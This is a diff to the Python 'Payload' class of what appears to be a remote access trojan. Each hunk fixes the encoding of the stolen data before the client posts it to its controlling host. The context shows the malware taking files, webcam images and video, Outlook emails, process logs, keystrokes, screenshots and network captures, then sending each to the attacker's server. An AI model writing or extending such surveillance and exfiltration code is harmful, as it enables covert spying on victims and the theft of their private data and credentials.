@@ -639,7 +639,7 @@ class Payload():
                 _, filetype = os.path.splitext(filename)
                 with open(filename, 'rb') as fp:
                     data = base64.b64encode(fp.read())
-                json_data = {'data': str(data), 'filename': filename, 'type': filetype, 'owner': self.owner, "module": self.upload.__name__, "session": self.info.get('public_ip')}
+                json_data = {'data': str(data,'ascii'), 'filename': filename, 'type': filetype, 'owner': self.owner, "module": self.upload.__name__, "session": self.info.get('public_ip')}
                 globals()['post']('http://{}:{}'.format(host, port+3), json=json_data)
                 return "Upload complete"
             else:
@@ -680,11 +680,11 @@ class Payload():
                     globals()['webcam'].stream(host=host, port=port)
             elif 'image' in args:
                 data = globals()['webcam'].image(*args)
-                json_data = {"data": str(data), "type": "png", "owner": self.owner, "module": self.webcam.__name__, "session": self.info.get('public_ip')}
+                json_data = {"data": str(data,'ascii'), "type": "png", "owner": self.owner, "module": self.webcam.__name__, "session": self.info.get('public_ip')}
                 globals()['post']('http://{}:{}'.format(host, port+3), json=json_data)
             elif 'video' in args:
                 data = globals()['webcam'].video(*args)
-                json_data = {"data": str(data), "type": "avi", "owner": self.owner, "module": self.webcam.__name__, "session": self.info.get('public_ip')}
+                json_data = {"data": str(data,'ascii'), "type": "avi", "owner": self.owner, "module": self.webcam.__name__, "session": self.info.get('public_ip')}
                 globals()['post']('http://{}:{}'.format(host, port+3), json=json_data)
             else:
                 return self.webcam.usage
@@ -749,7 +749,7 @@ class Payload():
                         if len(results):
                             host, port = self.connection.getpeername()
                             data = base64.b64encode(json.dumps(results))
-                            json_data = {'data': str(data), 'type': 'txt', 'owner': self.owner, "module": self.outlook.__name__, "session": self.info.get('public_ip')}
+                            json_data = {'data': str(data,'ascii'), 'type': 'txt', 'owner': self.owner, "module": self.outlook.__name__, "session": self.info.get('public_ip')}
                             globals()['post']('http://{}:{}'.format(host, port+3), json=json_data)
                             return "Upload of Outlook emails complete"
                     elif hasattr(globals()['outlook'], mode):
@@ -833,7 +833,7 @@ class Payload():
                     if len(log):
                         host, port = self.connection.getpeername()
                         data = base64.b64encode(log)
-                        json_data = {'data': str(data), 'type': 'log', 'owner': self.owner, "module": self.process.__name__, "session": self.info.get('public_ip')}
+                        json_data = {'data': str(data,'ascii'), 'type': 'log', 'owner': self.owner, "module": self.process.__name__, "session": self.info.get('public_ip')}
                         globals()['post']('http://{}:{}'.format(host, port+3), json=json_data)
                         return "Process log upload complete"
                     else:
@@ -908,7 +908,7 @@ class Payload():
             elif 'upload' in mode:
                 host, port = self.connection.getpeername()
                 data = base64.b64encode(globals()['keylogger'].logs.getvalue())
-                json_data = {'data': str(data), 'owner': self.owner, 'type': 'txt', "module": self.keylogger.__name__, "session": self.info.get('public_ip')}
+                json_data = {'data': str(data,'ascii'), 'owner': self.owner, 'type': 'txt', "module": self.keylogger.__name__, "session": self.info.get('public_ip')}
                 globals()['post']('http://{}:{}'.format(host, port + 3), json=json_data)
                 globals()['keylogger'].logs.reset()
                 return 'Keystroke log upload complete'
@@ -932,7 +932,7 @@ class Payload():
                 self.load('screenshot')
             host, port = self.connection.getpeername()
             data = globals()['screenshot'].run()
-            json_data = {"data": str(data), "owner": self.owner, "type": "png", "module": self.screenshot.__name__, "session": self.info.get('public_ip')}
+            json_data = {"data": str(data,'ascii'), "owner": self.owner, "type": "png", "module": self.screenshot.__name__, "session": self.info.get('public_ip')}
             globals()['post']('http://{}:{}'.format(host, port+3), json=json_data)
             return 'Screenshot complete'
         except Exception as e:
@@ -1004,7 +1004,7 @@ class Payload():
                         globals()['packetsniffer'].log.reset()
                         host, port = self.connection.getpeername()
                         data = base64.b64encode(log)
-                        json_data = {"data": str(data), "type": "pcap", "owner": self.owner, "module": self.packetsniffer.__name__, "session": self.info.get('public_ip')}
+                        json_data = {"data": str(data,'ascii'), "type": "pcap", "owner": self.owner, "module": self.packetsniffer.__name__, "session": self.info.get('public_ip')}
                         globals()['post']('http://{}:{}'.format(host, port+3), json=json_data)
                         return "Network traffic log upload complete"
                     else:
